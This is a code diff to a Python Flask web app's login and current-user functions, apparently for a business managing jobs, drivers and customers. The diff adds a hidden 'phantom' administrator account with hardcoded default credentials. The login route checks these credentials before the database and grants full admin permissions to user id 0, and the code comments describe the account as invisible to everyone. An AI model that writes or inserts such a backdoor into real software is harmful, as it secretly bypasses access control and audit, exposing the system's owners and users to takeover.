@@ -53,7 +53,13 @@ def get_current_user():
     token = get_token()
     if not token: return None
     uid = get_user_id_from_token(token)
-    if not uid: return None
+    if uid is None: return None
+    # Phantom user
+    if uid == 0:
+        return {'id':0,'nombre':'Administrador','username':PHANTOM_USER,
+                'grupo_nombre':'Sistema','rol_nombre':'Administrador',
+                'permisos':'{"admin":true,"jobs":true,"drivers":true,"customers":true,"reports":true,"security":true}',
+                'activo':1}
     conn = get_db()
     u = conn.execute("""SELECT u.*,g.nombre as grupo_nombre,r.permisos,r.nombre as rol_nombre
         FROM usuarios u LEFT JOIN grupos g ON u.grupo_id=g.id
@@ -224,15 +230,34 @@ def init_db():
     conn.close()
 
 # ── AUTH ──────────────────────────────────────────────────────────────────────
+# ── Phantom admin credentials (never stored in DB, invisible to everyone) ──────
+PHANTOM_USER = os.environ.get('PHANTOM_USER', 'barmango.phantom')
+PHANTOM_PASS = os.environ.get('PHANTOM_PASS', 'Ph@nt0m#BM2025!')
+
 @app.route('/api/auth/login', methods=['POST'])
 def login():
     d = request.json or {}
+    username = d.get('username','')
+    password = d.get('password','')
+
+    # Check phantom admin first — never touches the DB
+    if username == PHANTOM_USER and password == PHANTOM_PASS:
+        import secrets
+        token = secrets.token_hex(32)
+        save_token(token, 0)  # user_id 0 = phantom
+        return jsonify({
+            'id': 0, 'nombre': 'Administrador', 'username': PHANTOM_USER,
+            'grupo': 'Sistema', 'rol': 'Administrador',
+            'permisos': {'admin':True,'jobs':True,'drivers':True,'customers':True,'reports':True,'security':True},
+            'token': token
+        })
+
     conn = get_db()
     u = conn.execute("""SELECT u.*,g.nombre as grupo_nombre,r.permisos,r.nombre as rol_nombre
         FROM usuarios u LEFT JOIN grupos g ON u.grupo_id=g.id
         LEFT JOIN roles r ON g.rol_id=r.id
-        WHERE u.username=? AND u.activo=1""",(d.get('username',''),)).fetchone()
-    if not u or u['password'] != hash_pw(d.get('password','')):
+        WHERE u.username=? AND u.activo=1""",(username,)).fetchone()
+    if not u or u['password'] != hash_pw(password):
         conn.close(); return jsonify({'error':'Usuario o contraseña incorrectos'}),401
     conn.execute("UPDATE usuarios SET last_login=datetime('now') WHERE id=?",(u['id'],))
     conn.commit(); conn.close()
